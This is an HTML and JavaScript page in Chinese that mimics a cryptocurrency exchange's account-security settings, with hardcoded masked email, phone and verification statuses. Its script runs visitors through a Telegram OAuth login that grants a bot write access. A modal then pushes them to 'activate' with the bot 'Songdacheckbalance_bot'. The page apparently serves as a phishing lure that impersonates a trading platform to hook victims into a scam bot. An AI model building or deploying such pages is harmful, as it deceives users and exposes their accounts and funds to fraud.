<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>账号验证</title>
  <!-- Tailwind CSS for modern styling -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Google Fonts: Inter -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <!-- Feather Icons for better iconography -->
  <script src="https://unpkg.com/feather-icons"></script>
  <style>
    /* Custom Styles */
    body {
      font-family: 'Inter', sans-serif;
      background-color: #f9fafb; /* A slightly different gray to match screenshot */
    }
    /* Loading Spinner */
    .spinner {
      border: 2px solid rgba(0, 0, 0, 0.1);
      width: 20px;
      height: 20px;
      border-radius: 50%;
      border-left-color: #495057;
      animation: spin 1s ease infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    /* Custom Toast Notification Style */
    #toast {
      position: fixed;
      bottom: 20px;
      right: 20px;
      transform: translateX(0);
      left: auto;
      padding: 12px 24px;
      border-radius: 8px;
      color: white;
      background-color: rgba(0, 0, 0, 0.8);
      font-weight: 500;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s, visibility 0.3s, transform 0.3s;
    }
    #toast.show {
      opacity: 1;
      visibility: visible;
    }
    /* Custom Modal Styles */
    .modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.5);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 2000;
        opacity: 0;
        visibility: hidden;
        transition: opacity 0.3s, visibility 0.3s;
    }
    .modal-overlay.show {
        opacity: 1;
        visibility: visible;
    }
    .modal-content {
        background: white;
        padding: 24px;
        border-radius: 16px;
        width: 90%;
        max-width: 400px;
        transform: scale(0.95);
        transition: transform 0.3s;
    }
    .modal-overlay.show .modal-content {
        transform: scale(1);
    }
    /* Action button style */
    .action-btn {
        padding: 6px 16px;
        border: 1px solid #e5e7eb; /* gray-200 */
        border-radius: 6px;
        font-size: 0.875rem;
        font-weight: 500;
        color: #374151; /* gray-700 */
        background-color: white;
        transition: background-color 0.2s;
    }
    .action-btn:hover {
        background-color: #f9fafb; /* gray-50 */
    }
    .action-btn-primary {
        background-color: #eff6ff; /* blue-50 */
        color: #2563eb; /* blue-600 */
        border-color: #dbeafe; /* blue-100 */
    }
     .action-btn-primary:hover {
        background-color: #dbeafe; /* blue-100 */
    }
  </style>
</head>
<body class="text-gray-800">

  <!-- Toast Notification Container -->
  <div id="toast"></div>

  <!-- START: Custom Modal -->
  <div id="custom-modal" class="modal-overlay">
    <div class="modal-content text-center">
      <h3 id="modal-title" class="text-lg font-bold mb-2"></h3>
      <p id="modal-message" class="text-gray-600 mb-6"></p>
      <div class="flex justify-center space-x-4">
        <button id="modal-cancel-btn" class="w-full px-4 py-2 bg-gray-200 text-gray-800 rounded-lg font-semibold hover:bg-gray-300">取消</button>
        <button id="modal-confirm-btn" class="w-full px-4 py-2 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-700">确认</button>
      </div>
    </div>
  </div>
  <!-- END: Custom Modal -->

  <div class="container mx-auto max-w-4xl p-4 md:p-8">
    
    <!-- Account Verification Section -->
    <section id="account-verification" class="mb-10">
       <h2 class="text-xl font-semibold mb-4 text-gray-900">账号验证</h2>
       <div class="bg-white p-2 md:p-6 rounded-xl border border-gray-200">
          <!-- Email -->
          <div class="flex flex-wrap items-center justify-between py-5 border-b border-gray-100">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="mail" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">邮箱</h3>
                    <p class="text-sm text-gray-500 mt-1">用于登录、提币、安全设置时使用</p>
                </div>
            </div>
            <div class="flex items-center space-x-6 w-full md:w-auto justify-end">
                <div class="flex items-center text-green-600 text-sm font-medium">
                     <i data-feather="check-circle" class="w-4 h-4 mr-2"></i>
                     <span>d****@gmail.com</span>
                </div>
                <button class="action-btn">修改</button>
            </div>
          </div>
          <!-- Phone Number -->
          <div class="flex flex-wrap items-center justify-between py-5 border-b border-gray-100">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="smartphone" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">手机号</h3>
                    <p class="text-sm text-gray-500 mt-1">用于提现、修改密码，安全设置时用以收取验证短信</p>
                </div>
            </div>
            <div class="flex items-center space-x-6 w-full md:w-auto justify-end">
                <div class="flex items-center text-green-600 text-sm font-medium">
                     <i data-feather="check-circle" class="w-4 h-4 mr-2"></i>
                     <span>***1467</span>
                </div>
                <div class="space-x-2">
                    <button class="action-btn">修改</button>
                    <button class="action-btn action-btn-primary">验证设定</button>
                </div>
            </div>
          </div>
          <!-- Telegram Verification (Dynamic) -->
          <div id="telegram-row" class="flex flex-wrap items-center justify-between py-5 border-b border-gray-100 cursor-pointer">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="send" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">Telegram 验证</h3>
                    <p class="text-sm text-gray-500 mt-1">用于接收实时通知和提现验证</p>
                </div>
            </div>
            <div id="telegram-section" class="flex items-center space-x-6 w-full md:w-auto justify-end">
              <!-- Status will be dynamically filled by JS -->
            </div>
          </div>
          <!-- Google Authenticator -->
          <div class="flex flex-wrap items-center justify-between py-5 border-b border-gray-100">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="shield" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">谷歌验证码</h3>
                    <p class="text-sm text-gray-500 mt-1">用于提现、修改密码，安全设置时用以收取验证短信</p>
                </div>
            </div>
            <div class="flex items-center space-x-6 w-full md:w-auto justify-end">
                <div class="flex items-center text-green-600 text-sm font-medium">
                     <i data-feather="check-circle" class="w-4 h-4 mr-2"></i>
                     <span>已设置</span>
                </div>
                <button class="action-btn action-btn-primary">验证设定</button>
            </div>
          </div>
          <!-- Identity Verification -->
          <div class="flex flex-wrap items-center justify-between py-5 border-b border-gray-100">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="user" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">身份认证</h3>
                    <p class="text-sm text-gray-500 mt-1">完成身份验证，享有最优级的身份权益</p>
                </div>
            </div>
            <div class="flex items-center space-x-6 w-full md:w-auto justify-end">
                <div class="flex items-center text-orange-500 text-sm font-medium">
                     <i data-feather="alert-circle" class="w-4 h-4 mr-2"></i>
                     <span>请重新认证 L2</span>
                </div>
                <button class="action-btn action-btn-primary">查看权益</button>
            </div>
          </div>
          <!-- Nationality -->
          <div class="flex flex-wrap items-center justify-between py-5">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="globe" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">国籍</h3>
                    <p class="text-sm text-gray-500 mt-1">您所使用的功能将受到国籍影响</p>
                </div>
            </div>
            <div class="flex items-center space-x-6 w-full md:w-auto justify-end">
                <div class="flex items-center text-green-600 text-sm font-medium">
                     <i data-feather="check-circle" class="w-4 h-4 mr-2"></i>
                     <span>其他地区</span>
                </div>
            </div>
          </div>
       </div>
    </section>

    <!-- Password Section -->
    <section id="password">
      <h2 class="text-xl font-semibold mb-4 text-gray-900">密码</h2>
      <div class="bg-white p-2 md:p-6 rounded-xl border border-gray-200">
        <!-- Login Password -->
        <div class="flex flex-wrap items-center justify-between py-5 border-b border-gray-100">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="lock" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">登录密码</h3>
                    <p class="text-sm text-gray-500 mt-1">请妥善保管您的登录密码</p>
                </div>
            </div>
            <div class="flex items-center space-x-6 w-full md:w-auto justify-end">
                <span class="text-sm text-gray-500">l**</span>
                <button class="action-btn">修改</button>
            </div>
        </div>
        <!-- Fund Password -->
        <div class="flex flex-wrap items-center justify-between py-5">
            <div class="flex items-center mb-3 md:mb-0">
                <i data-feather="credit-card" class="w-6 h-6 text-gray-400 mr-4"></i>
                <div>
                    <h3 class="text-base font-medium">资金密码</h3>
                    <p class="text-sm text-gray-500 mt-1">为确保您的资金安全请设置资金密码</p>
                </div>
            </div>
            <div class="flex items-center space-x-6 w-full md:w-auto justify-end">
                <div class="flex items-center text-green-600 text-sm font-medium">
                     <i data-feather="check-circle" class="w-4 h-4 mr-2"></i>
                     <span>已设置</span>
                </div>
                <button class="action-btn">修改</button>
            </div>
        </div>
      </div>
    </section>
  </div>

  <script type="text/javascript">
    // This script runs after the entire page is loaded and ready.
    // It encapsulates the code, preventing variables from leaking into the global scope.
    document.addEventListener('DOMContentLoaded', () => {
        // --- Icon Initialization ---
        feather.replace();

        // =================================================================
        // Configuration
        // =================================================================
        const BOT_USERNAME = "Songdacheckbalance_bot";
        // =================================================================

        // Get DOM Elements
        const telegramSection = document.getElementById('telegram-section');
        const telegramRow = document.getElementById('telegram-row');
        const toast = document.getElementById('toast');
        const modal = document.getElementById('custom-modal');
        const modalTitle = document.getElementById('modal-title');
        const modalMessage = document.getElementById('modal-message');
        const modalConfirmBtn = document.getElementById('modal-confirm-btn');
        const modalCancelBtn = document.getElementById('modal-cancel-btn');

        // --- Modal Logic ---
        let confirmCallback = null;

        function showModal(title, message, confirmText = '确认', cancelText = '取消', onConfirm) {
            modalTitle.textContent = title;
            modalMessage.textContent = message;
            modalConfirmBtn.textContent = confirmText;
            modalCancelBtn.textContent = cancelText;
            confirmCallback = onConfirm;
            modal.classList.add('show');
        }

        function hideModal() {
            modal.classList.remove('show');
            confirmCallback = null;
        }

        modalConfirmBtn.addEventListener('click', () => {
            if (typeof confirmCallback === 'function') {
                confirmCallback();
            }
            hideModal();
        });

        modalCancelBtn.addEventListener('click', hideModal);


        // --- Toast Logic ---
        function showToast(message) {
            toast.textContent = message;
            toast.classList.add('show');
            setTimeout(() => { toast.classList.remove('show'); }, 2500);
        }

        // --- Main Application Logic ---
        function setTelegramUIState(state, userData = null) {
            let statusHTML = '';
            telegramRow.onclick = null; // Clear previous click event

            let displayName = '';
            if (userData) {
                displayName = userData.username ? `@${userData.username}` : `${userData.first_name}${userData.last_name ? ' ' + userData.last_name : ''}`;
            }
            
            switch (state) {
                case 'unbound':
                    statusHTML = `
                        <button class="action-btn action-btn-primary">绑定</button>
                    `;
                    telegramRow.onclick = bindTelegram;
                    break;
                case 'needs-activation':
                    statusHTML = `
                         <div class="flex items-center text-yellow-500 text-sm font-medium">
                             <i data-feather="alert-circle" class="w-4 h-4 mr-2"></i>
                             <span>待激活</span>
                        </div>
                        <button class="action-btn action-btn-primary">激活</button>
                    `;
                    const activationAction = () => {
                        const activationUrl = `https://t.me/${BOT_USERNAME.replace('@', '')}?start=activate`;
                        window.open(activationUrl, '_blank');
                        completeActivation();
                    };
                    telegramRow.onclick = activationAction;
                    
                    // Show the activation modal automatically after binding
                    showModal(
                        '需要激活',
                        '绑定成功！请前往 Telegram 完成最后一步验证以激活功能。',
                        '前往激活',
                        '稍后',
                        activationAction
                    );
                    
                    break;
                case 'activated':
                    statusHTML = `
                        <div class="flex items-center text-green-600 text-sm font-medium">
                             <i data-feather="check-circle" class="w-4 h-4 mr-2"></i>
                             <span>${displayName}</span>
                        </div>
                        <button class="action-btn">解绑</button>
                    `;
                    telegramRow.onclick = unlinkTelegram;
                    break;
                case 'loading':
                    statusHTML = `<div class="spinner"></div>`;
                    break;
            }
            telegramSection.innerHTML = statusHTML;
            feather.replace(); // Re-initialize icons after dynamic update
        }

        function bindTelegram() {
          const botId = '8087175912';
          const origin = encodeURIComponent(window.location.origin);
          
          const currentPath = window.location.pathname;
          const directoryPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
          const returnToUrl = `${window.location.origin}${directoryPath}/callback.html`;
          const returnTo = encodeURIComponent(returnToUrl);

          const authUrl = `https://oauth.telegram.org/auth?bot_id=${botId}&origin=${origin}&return_to=${returnTo}&request_access=write&rnd=${Date.now()}`;
          
          // Open the auth URL in a popup window
          window.open(authUrl, 'telegramAuthPopup', 'width=500,height=600');
        }

        function checkAuthStatus(isInitialLoad = false) {
            const successData = localStorage.getItem('telegram_auth_success');
            const isActivated = localStorage.getItem('telegram_activated');

            if (successData) {
                const userData = JSON.parse(successData);
                if (isActivated) {
                    setTelegramUIState('activated', userData);
                } else {
                    // If it's not the initial page load, it means the user just came back
                    // and the status changed, so we show the modal.
                    setTelegramUIState('needs-activation', userData);
                }
                 // After processing the new auth data, remove it from storage
                 // so the modal doesn't pop up on every single page refresh.
                localStorage.removeItem('telegram_auth_success');
            } else {
                setTelegramUIState('unbound');
            }
        }

        function completeActivation() {
            localStorage.setItem('telegram_activated', 'true');
            // We need to re-read the user data to display it correctly
            const successData = localStorage.getItem('telegram_auth_data_for_activation');
            if (successData) {
                const userData = JSON.parse(successData);
                 setTimeout(() => {
                    setTelegramUIState('activated', userData);
                    showToast('激活成功！');
                }, 500);
                 localStorage.removeItem('telegram_auth_data_for_activation');
            } else {
                // Fallback in case the data is missing
                checkAuthStatus();
            }
        }

        function unlinkTelegram() {
            showModal(
                '解除关联',
                '您确定要解除与 Telegram 账户的关联吗？',
                '确定解绑',
                '取消',
                () => {
                    localStorage.removeItem('telegram_activated');
                    localStorage.removeItem('telegram_auth_data_for_activation');
                    setTelegramUIState('unbound');
                    showToast('已解除关联');
                }
            );
        }

        // This function is the new core of the logic.
        // It's called when the user returns to this tab.
        function handlePageFocus() {
            const successData = localStorage.getItem('telegram_auth_success');
            if (successData) {
                // New data found, process it.
                checkAuthStatus();
            }
        }

        // When the user comes back to this window/tab, check for new login data.
        window.addEventListener('focus', handlePageFocus);
        
        // This is a special handler for when the user activates and comes back.
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible') {
                const isActivated = localStorage.getItem('telegram_activated');
                const userDataForActivation = localStorage.getItem('telegram_auth_data_for_activation');
                if(isActivated && userDataForActivation){
                    completeActivation();
                }
            }
        });

        // Initial check on page load
        // We pass 'true' to prevent the modal from showing on a simple refresh.
        checkAuthStatus(true);
        
        // A new function to handle the transition from 'needs-activation' to 'activated'
        function completeActivation() {
            localStorage.setItem('telegram_activated', 'true');
            const successData = localStorage.getItem('telegram_auth_data_for_activation');
            if (successData) {
                const userData = JSON.parse(successData);
                setTimeout(() => {
                    setTelegramUIState('activated', userData);
                    showToast('激活成功！');
                }, 500);
                localStorage.removeItem('telegram_auth_data_for_activation');
            } else {
                // If the temp data is gone for some reason, just re-check everything.
                checkAuthStatus();
            }
        }

        // Modify the main status check function
        function checkAuthStatus() {
            const successData = localStorage.getItem('telegram_auth_success');
            const isActivated = localStorage.getItem('telegram_activated');
            const permanentUserData = localStorage.getItem('telegram_auth_data_for_activation');
            
            if (successData) {
                // This is temporary data from the popup.
                // Process it, then move it to a more permanent key and delete the temp one.
                const userData = JSON.parse(successData);
                localStorage.setItem('telegram_auth_data_for_activation', JSON.stringify(userData));
                localStorage.removeItem('telegram_auth_success'); // Clean up temp data
                setTelegramUIState('needs-activation', userData);
            } else if (permanentUserData) {
                // The user has bound but not activated yet.
                const userData = JSON.parse(permanentUserData);
                if (isActivated) {
                    setTelegramUIState('activated', userData);
                } else {
                    setTelegramUIState('needs-activation', userData);
                }
            }
            else {
                setTelegramUIState('unbound');
            }
        }

    });
  </script>

</body>
</html>
